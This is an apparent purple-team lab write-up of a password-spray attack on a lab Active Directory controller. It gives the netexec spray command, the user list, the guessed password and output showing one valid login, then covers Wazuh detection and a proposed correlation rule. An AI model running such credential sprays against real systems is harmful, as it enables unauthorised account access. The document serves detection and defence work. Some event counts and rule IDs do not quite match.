# Phase 2: Initial Access via Password Spray

MITRE ATT&CK: T1110.003

## Tool Installation: crackmapexec Failed, Switched to netexec

The original plan was to use crackmapexec (CME) but it could not be installed:

```bash
apt install crackmapexec -y
```

```
Err: http://http.kali.org/kali kali-rolling/main amd64
     python3-terminaltables3_4.0.0-7_all.deb  404  Not Found
Unable to fetch some archives, maybe run apt-get update or try --fix-missing
```

```bash
apt install crackmapexec --fix-missing -y
```

That also failed with a dependency conflict. The package python3-terminaltables3 version 4.0.0-7 had been removed from the Kali rolling repository. Running apt update first pulled in version 4.0.0-8 which resolved the dependency:

```bash
apt update -y
apt install netexec -y
```

netexec 1.5.1 installed successfully. netexec is the officially maintained successor to crackmapexec and accepts the same command syntax via the `nxc` binary.

## Prepare User List

```bash
cat << 'EOF' > /tmp/users.txt
john.doe
svc-backup
svc-legacy
administrator
guest
krbtgt
EOF
```

## Execute the Spray

```bash
nxc smb 192.168.90.121 \
  -u /tmp/users.txt \
  -p 'Winter2024!' \
  --continue-on-success
```

## Actual Output

```
SMB  192.168.90.121  445  WINDOWS-AD-DC
     Windows Server 2022 Build 20348 x64
     name:WINDOWS-AD-DC  domain:lab.local  signing:True  SMBv1:None  Null Auth:True

SMB  192.168.90.121  445  WINDOWS-AD-DC  [+] lab.local\john.doe:Winter2024!
SMB  192.168.90.121  445  WINDOWS-AD-DC  [-] lab.local\svc-backup:Winter2024! STATUS_LOGON_FAILURE
SMB  192.168.90.121  445  WINDOWS-AD-DC  [-] lab.local\svc-legacy:Winter2024! STATUS_LOGON_FAILURE
SMB  192.168.90.121  445  WINDOWS-AD-DC  [-] lab.local\administrator:Winter2024! STATUS_LOGON_FAILURE
SMB  192.168.90.121  445  WINDOWS-AD-DC  [-] lab.local\guest:Winter2024! STATUS_LOGON_FAILURE
SMB  192.168.90.121  445  WINDOWS-AD-DC  [-] lab.local\krbtgt:Winter2024! STATUS_LOGON_FAILURE
```

One valid credential found out of six attempts. Only john.doe uses Winter2024! as their password, which matches the spray guess.

## Wazuh Detection

Seven event 4625 records were ingested by Wazuh, all from source IP 192.168.24.2, targeting the six accounts in the list:

```
Rule:    60122  Logon Failure Unknown user or bad password
Level:   5
Events:  7
Source:  192.168.24.2
Time:    08:12 to 08:20 UTC
```

Confirmed in OpenSearch:

```json
GET wazuh-alerts-*/_search
{
  "query": {
    "bool": {
      "must": [
        { "match": { "data.win.system.eventID": "4625" } },
        { "range": { "timestamp": { "gte": "now-3h" } } }
      ]
    }
  }
}
```

Result: 7 hits.

## Detection Gap

Level 5 is below the threshold that would trigger an analyst response in most SOC configurations. More importantly, there is no existing rule that correlates the spray pattern itself. The fact that one source IP hit six different usernames in rapid succession is not flagged as suspicious. A custom frequency-based rule would catch this:

```xml
<rule id="92751" level="12" frequency="5" timeframe="60">
  <if_matched_sid>60106</if_matched_sid>
  <same_field>data.win.eventdata.ipAddress</same_field>
  <different_field>data.win.eventdata.targetUserName</different_field>
  <description>Password spray: same source IP failing against multiple usernames within 60 seconds</description>
  <mitre><id>T1110.003</id></mitre>
</rule>
```

This rule was not deployed during the session. It is included in windows_redteam_detection.xml for future deployment.
